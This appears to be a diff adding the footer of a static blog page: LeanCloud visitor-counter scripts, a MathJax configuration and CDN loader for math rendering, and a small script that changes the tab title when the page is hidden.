+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '(～﹃～)~zZ';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(￣▽￣)';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
